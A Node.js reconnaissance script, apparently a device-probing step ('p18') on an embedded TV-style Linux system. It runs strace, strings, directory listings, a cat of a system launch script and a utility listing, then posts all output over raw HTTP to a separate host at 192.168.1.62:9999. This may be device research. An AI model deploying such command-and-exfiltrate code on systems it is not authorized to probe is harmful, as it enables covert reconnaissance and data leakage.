"use strict";
/* p18: dotnet-launcher deep dive — strace, strings, AOT runtime state, wasutility */
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
var HOST = '192.168.1.62';
var PORT = 9999;
var SDK = '/home/owner/share/tmp/sdk_tools';
var APP = SDK + '/swapapp';
var R = { ts: new Date().toISOString(), probe: 'p18', results: {}, log: [] };
function L(s) { R.log.push(String(s).substring(0, 500)); }
function run(cmd, timeout) {
  try { return cp.execSync(cmd, { timeout: timeout || 30000, maxBuffer: 16*1024*1024 }).toString().trim(); }
  catch (e) { var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString(); return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text) {
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},60000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
R.results.tools = run('which strace ltrace 2>&1; echo ---; ls /usr/bin/strace 2>&1', 10000);
R.results.strace = run('strace -f -e trace=openat,open,execve,read /usr/bin/dotnet-launcher ' + APP + ' 2>&1 | tail -80', 40000);
R.results.dnet_strings = run('strings /usr/bin/dotnet-launcher 2>/dev/null | grep -iE "app.?path|root.?path|dotnet_error|usage|AUL_APP|manifest|execute_assembly|corerun|\\.dll|cannot|fail|error" | head -50', 20000);
R.results.aot_runtime = run('ls -la /opt/dotnet/runtime/ 2>&1 | head -25', 15000);
R.results.aot_runtime2 = run('ls -la /opt/dotnet/ 2>&1 | head -20', 15000);
R.results.tvctx_launcher = run('cat /etc/tvctx-manager/launch_tvctx_manager.sh 2>&1', 15000);
R.results.wasutility = run('wasutility 2>&1 | head -30; echo ---LIST---; wasutility list 2>&1 | head -20', 20000);
R.results.final = 'done ' + new Date().toISOString();
postRaw('/p18info', JSON.stringify(R));
L('p18 done');
